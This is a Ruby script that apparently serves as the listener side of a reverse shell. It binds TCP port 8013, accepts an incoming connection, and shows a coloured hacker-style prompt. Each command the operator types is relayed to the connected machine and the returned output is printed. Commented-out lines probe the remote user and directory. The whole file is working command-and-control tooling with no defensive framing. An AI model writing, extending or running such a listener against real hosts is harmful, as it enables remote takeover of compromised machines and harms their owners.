require "socket"
require "colorize"

host = "0.0.0.0"
port = 8013

server = TCPServer.new(host, port)
puts "Listening on #{host}:#{port.to_s}"
loop do
	puts "Waiting for connection"
	begin
		client = server.accept
		if true
			# currentDirCommand = client.gets
			sock_domain, remote_port, remote_hostname, remote_ip = client.peeraddr
			puts "Received connection from ".yellow.bold + "#{remote_ip}".green.bold
			loop do
				# client.puts "whoami"
				# whoami = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
				# client.puts currentDirCommand
				# cd = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
				
				puts " "
				puts "┌──".red.bold + "(".red.bold  + "#{remote_ip}".green.bold + ")".red.bold + "-".red.bold + "[".red.bold + "~/Desktop".yellow.bold + "]".red.bold
				print "└─".red.bold + "$ ".green.bold
			

				
				
				cmd = gets.chomp
				
				puts "sended cmd == #{cmd}"
				
				client.puts cmd
				
				
				if cmd.downcase == "exit"
					puts "Exiting..."
					break
				end
				out = client.gets.chomp.gsub("\\NEWLINE", "\n")
				print out
			end
		else
			client.close
		end
	rescue Interrupt
		client.puts "exit"
		puts "\nExiting...".red.bold
		exit
	end
end